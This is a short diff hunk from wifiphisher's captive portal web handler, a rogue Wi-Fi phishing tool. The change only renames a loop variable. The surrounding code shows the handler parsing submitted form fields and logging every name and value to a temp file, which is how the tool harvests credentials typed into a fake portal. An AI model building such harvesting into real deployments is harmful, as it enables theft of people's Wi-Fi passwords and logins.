@@ -54,8 +54,8 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
     def post(self, url):
         form_data = self.request.body.split('&')
         form_values = []
-        for this_form_data in form_data:
-            form_values.append(this_form_data.split('='))
+        for each_form_data in form_data:
+            form_values.append(each_form_data.split('='))
         for input_name,input_value in form_values:
             with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                 log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T +
